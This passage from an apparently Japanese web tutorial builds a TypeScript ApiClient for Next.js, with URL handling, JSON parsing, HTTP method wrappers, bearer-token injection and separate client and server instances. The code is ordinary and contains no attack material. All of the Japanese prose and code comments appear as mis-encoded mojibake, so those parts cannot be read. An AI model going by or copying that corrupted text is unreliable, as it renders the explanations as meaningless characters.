      <span class="token keyword">throw</span> error<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token function">buildUrl</span><span class="token punctuation">(</span>endpoint<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">string</span> <span class="token punctuation">{</span>
    <span class="token comment">// çµ¶å¯¾URLã¨ç›¸å¯¾URLã®ä¸¡æ–¹ã‚’å‡¦ç†</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>endpoint<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> endpoint<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>baseUrl<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>endpoint<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">?</span> endpoint <span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>endpoint<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token function">buildRequestOptions</span><span class="token punctuation">(</span>options<span class="token operator">:</span> RequestInit<span class="token punctuation">)</span><span class="token operator">:</span> RequestInit <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">{</span>
      <span class="token operator">...</span>options<span class="token punctuation">,</span>
      headers<span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>defaultHeaders<span class="token punctuation">,</span>
        <span class="token operator">...</span>options<span class="token punctuation">.</span>headers<span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token keyword">async</span> <span class="token generic-function"><span class="token function">parseResponse</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>response<span class="token operator">:</span> Response<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> contentType <span class="token operator">=</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>contentType<span class="token operator">?.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'application/json'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ApiError</span><span class="token punctuation">(</span><span class="token string">'Invalid JSON response'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// ãƒ†ã‚­ã‚¹ãƒˆãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’å‡¦ç†</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">await</span> response<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">unknown</span> <span class="token keyword">as</span> <span class="token constant">T</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><strong>ã“ã“ã§ã®é‡è¦ãªç‚¹</strong>ã¯ã€<code class="language-text">fetch</code>ã®æŒ™å‹•ã‚’ã‚ˆã‚Šç›´æ„Ÿçš„ãªã‚‚ã®ã«å¤‰æ›ã—ã¦ã„ã‚‹ã“ã¨ã§ã™ã€‚<code class="language-text">response.ok</code>ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€HTTPã‚¨ãƒ©ãƒ¼ã«å¯¾ã—ã¦ã‚¨ãƒ©ãƒ¼ã‚’throwã™ã‚‹ã“ã¨ã§ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³å…¨ä½“ã§ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ãŒäºˆæ¸¬å¯èƒ½ã§ä¸€è²«ã—ãŸã‚‚ã®ã«ãªã‚Šã¾ã™ã€‚</p>
<h2>HTTPãƒ¡ã‚½ãƒƒãƒ‰ã®ä¾¿åˆ©ãªãƒ©ãƒƒãƒ‘ãƒ¼ãƒ¡ã‚½ãƒƒãƒ‰ã‚’è¿½åŠ ã™ã‚‹</h2>
<p>æ¬¡ã«ã€é–‹ç™ºè€…ãŒå®Ÿéš›ã«ä½¿ç”¨ã™ã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ã‚’è¿½åŠ ã—ã¾ã—ã‚‡ã†ã€‚</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token comment">// lib/api.ts (ç¶šã)</span>
<span class="token keyword">class</span> <span class="token class-name">ApiClient</span> <span class="token punctuation">{</span>
  <span class="token comment">// ... å‰ã®ã‚³ãƒ¼ãƒ‰</span>

  <span class="token keyword">async</span> <span class="token generic-function"><span class="token function">get</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>endpoint<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> options<span class="token operator">?</span><span class="token operator">:</span> RequestInit<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span>ApiResponse<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">>></span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token generic-function"><span class="token function">makeRequest</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>endpoint<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token operator">...</span>options<span class="token punctuation">,</span> method<span class="token operator">:</span> <span class="token string">'GET'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">async</span> <span class="token generic-function"><span class="token function">post</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>
    endpoint<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span>
    data<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span>
    options<span class="token operator">?</span><span class="token operator">:</span> RequestInit
  <span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span>ApiResponse<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">>></span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token generic-function"><span class="token function">makeRequest</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>endpoint<span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token operator">...</span>options<span class="token punctuation">,</span>
      method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
      body<span class="token operator">:</span> data <span class="token operator">?</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">async</span> <span class="token generic-function"><span class="token function">put</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>
    endpoint<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span>
    data<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span>
    options<span class="token operator">?</span><span class="token operator">:</span> RequestInit
  <span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span>ApiResponse<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">>></span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token generic-function"><span class="token function">makeRequest</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>endpoint<span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token operator">...</span>options<span class="token punctuation">,</span>
      method<span class="token operator">:</span> <span class="token string">'PUT'</span><span class="token punctuation">,</span>
      body<span class="token operator">:</span> data <span class="token operator">?</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">async</span> <span class="token keyword">delete</span><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span><span class="token punctuation">(</span>endpoint<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> options<span class="token operator">?</span><span class="token operator">:</span> RequestInit<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span>ApiResponse<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">>></span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token generic-function"><span class="token function">makeRequest</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>endpoint<span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token operator">...</span>options<span class="token punctuation">,</span> method<span class="token operator">:</span> <span class="token string">'DELETE'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">async</span> <span class="token generic-function"><span class="token function">patch</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>
    endpoint<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span>
    data<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">any</span><span class="token punctuation">,</span>
    options<span class="token operator">?</span><span class="token operator">:</span> RequestInit
  <span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span>ApiResponse<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">>></span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token generic-function"><span class="token function">makeRequest</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>endpoint<span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token operator">...</span>options<span class="token punctuation">,</span>
      method<span class="token operator">:</span> <span class="token string">'PATCH'</span><span class="token punctuation">,</span>
      body<span class="token operator">:</span> data <span class="token operator">?</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>POSTã€PUTã€PATCHãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ãƒ‡ãƒ¼ã‚¿ã‚’è‡ªå‹•çš„ã«JSON.stringifyã—ã¦ã„ã‚‹ç‚¹ã«æ³¨ç›®ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£ã®stringifyã‚’å¿˜ã‚Œã‚‹ã¨ã„ã†ã€ã‚‚ã†ä¸€ã¤ã®ã‚ˆãã‚ã‚‹ãƒã‚°ã®åŸå› ã‚’æ’é™¤ã—ã¾ã™ã€‚</p>
<h2>èªè¨¼ï¼šãƒˆãƒ¼ã‚¯ãƒ³ç®¡ç†ã®èª²é¡Œ</h2>
<p>Next.jsã§ã¯èªè¨¼ãŒé¢ç™½ããªã‚‹ã¨ã“ã‚ã§ã™ã€‚å¾“æ¥ã®SPAã¨ã¯ç•°ãªã‚Šã€ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®ä¸¡æ–¹ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’è€ƒæ…®ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚èªè¨¼ã‚µãƒãƒ¼ãƒˆã‚’è¿½åŠ ã—ã¾ã—ã‚‡ã†ã€‚</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token comment">// lib/api.ts (ç¶šã)</span>
<span class="token keyword">interface</span> <span class="token class-name">AuthConfig</span> <span class="token punctuation">{</span>
  tokenProvider<span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token builtin">string</span> <span class="token operator">|</span> <span class="token keyword">null</span><span class="token operator">></span> <span class="token operator">|</span> <span class="token builtin">string</span> <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  tokenHeader<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
  tokenPrefix<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">ApiClient</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> authConfig<span class="token operator">:</span> AuthConfig<span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span>config<span class="token operator">:</span> ApiConfig <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> authConfig<span class="token operator">:</span> AuthConfig <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// ... å‰ã®ã‚³ãƒ³ã‚¹ãƒˆãƒ©ã‚¯ã‚¿ã®ã‚³ãƒ¼ãƒ‰</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>authConfig <span class="token operator">=</span> <span class="token punctuation">{</span>
      tokenHeader<span class="token operator">:</span> <span class="token string">'Authorization'</span><span class="token punctuation">,</span>
      tokenPrefix<span class="token operator">:</span> <span class="token string">'Bearer'</span><span class="token punctuation">,</span>
      <span class="token operator">...</span>authConfig<span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">private</span> <span class="token keyword">async</span> <span class="token function">buildRequestOptions</span><span class="token punctuation">(</span>options<span class="token operator">:</span> RequestInit<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span>RequestInit<span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> headers <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">...</span><span class="token keyword">this</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>defaultHeaders <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token comment">// åˆ©ç”¨å¯èƒ½ãªå ´åˆã¯èªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ã‚’è¿½åŠ </span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>authConfig<span class="token punctuation">.</span>tokenProvider<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> token <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>authConfig<span class="token punctuation">.</span><span class="token function">tokenProvider</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        headers<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>authConfig<span class="token punctuation">.</span>tokenHeader<span class="token operator">!</span><span class="token punctuation">]</span> <span class="token operator">=</span>
          <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>authConfig<span class="token punctuation">.</span>tokenPrefix<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>token<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> <span class="token punctuation">{</span>
      <span class="token operator">...</span>options<span class="token punctuation">,</span>
      headers<span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token operator">...</span>headers<span class="token punctuation">,</span>
        <span class="token operator">...</span>options<span class="token punctuation">.</span>headers<span class="token punctuation">,</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment">// makeRequestã‚’æ›´æ–°ã—ã¦ã€éåŒæœŸã®buildRequestOptionsã‚’ä½¿ç”¨ã™ã‚‹ã‚ˆã†ã«ã™ã‚‹</span>
  <span class="token keyword">private</span> <span class="token keyword">async</span> <span class="token generic-function"><span class="token function">makeRequest</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>
    endpoint<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span>
    options<span class="token operator">:</span> RequestInit <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span>ApiResponse<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">>></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">buildUrl</span><span class="token punctuation">(</span>endpoint<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> requestOptions <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">buildRequestOptions</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// ... ãƒ¡ã‚½ãƒƒãƒ‰ã®æ®‹ã‚Šã®éƒ¨åˆ†ã¯åŒã˜</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã“ã§ã¯<strong>ãƒˆãƒ¼ã‚¯ãƒ³ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ãƒ‘ã‚¿ãƒ¼ãƒ³</strong>ãŒéå¸¸ã«é‡è¦ã§ã™ã€‚ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›´æ¥ä¿å­˜ã™ã‚‹ä»£ã‚ã‚Šã«ã€ãã‚Œã‚’å–å¾—ã§ãã‚‹é–¢æ•°ã‚’æä¾›ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ä»¥ä¸‹ã®ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚</p>
<ul>
<li>ã•ã¾ã–ã¾ãªã‚½ãƒ¼ã‚¹ï¼ˆlocalStorageã€Cookieã€ãƒ¡ãƒ¢ãƒªï¼‰ã‹ã‚‰<strong>æ–°ã—ã„ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ãƒ•ã‚§ãƒƒãƒã™ã‚‹</strong></li>
<li><strong>ãƒˆãƒ¼ã‚¯ãƒ³æ›´æ–°</strong>ãƒ­ã‚¸ãƒƒã‚¯ã‚’é€éçš„ã«å‡¦ç†ã™ã‚‹</li>
<li>ç•°ãªã‚‹ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’æŒã¤ã‚µãƒ¼ãƒãƒ¼ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®<strong>ä¸¡æ–¹ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§å‹•ä½œã™ã‚‹</strong></li>
</ul>
<h2>ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’æ„è­˜ã—ãŸAPIã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ä½œæˆ</h2>
<p>ã“ã“ã‹ã‚‰ãŒNext.jsãªã‚‰ã§ã¯ã®é­”æ³•ã®å‡ºç•ªã§ã™ã€‚å®Ÿè¡Œã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã”ã¨ã«ç•°ãªã‚‹è¨­å®šãŒå¿…è¦ã§ã™ã€‚</p>
<div class="gatsby-highlight" data-language="ts"><pre style="counter-reset: linenumber NaN" class="language-ts line-numbers"><code class="language-ts"><span class="token comment">// lib/api.ts (ç¶šã)</span>

<span class="token comment">// ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ï¼ˆãƒ–ãƒ©ã‚¦ã‚¶ã®ã¿ï¼‰</span>
<span class="token keyword">const</span> getClientToken <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">string</span> <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> window <span class="token operator">===</span> <span class="token string">'undefined'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'auth_token'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ãƒ—ãƒ­ãƒã‚¤ãƒ€ãƒ¼ï¼ˆSSRç”¨ï¼‰</span>
<span class="token keyword">const</span> getServerToken <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">string</span> <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token comment">// ã‚µãƒ¼ãƒãƒ¼ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã¯ã€Cookieã‹ã‚‰ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™</span>
  <span class="token comment">// ã“ã‚Œã¯ç°¡ç•¥åŒ–ã•ã‚ŒãŸä¾‹ã§ã™ - å®Ÿéš›ã«ã¯Next.jsã®headers()ã‚’ä½¿ç”¨ã—ã¾ã™</span>
  <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã”ã¨ã«ç•°ãªã‚‹ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’ä½œæˆ</span>
<span class="token keyword">export</span> <span class="token keyword">const</span> clientApi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApiClient</span><span class="token punctuation">(</span>
  <span class="token punctuation">{</span>
    baseUrl<span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NEXT_PUBLIC_API_URL</span> <span class="token operator">||</span> <span class="token string">'/api'</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    tokenProvider<span class="token operator">:</span> getClientToken<span class="token punctuation">,</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> serverApi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApiClient</span><span class="token punctuation">(</span>
  <span class="token punctuation">{</span>
    baseUrl<span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">API_URL</span> <span class="token operator">||</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">NEXT_PUBLIC_API_URL</span> <span class="token operator">||</span> <span class="token string">'http://localhost:3000/api'</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">{</span>
    tokenProvider<span class="token operator">:</span> getServerToken<span class="token punctuation">,</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// åˆ©ä¾¿æ€§ã®ãŸã‚ã«ã€ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚’æ„è­˜ã—ãŸAPIã‚’ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆ</span>
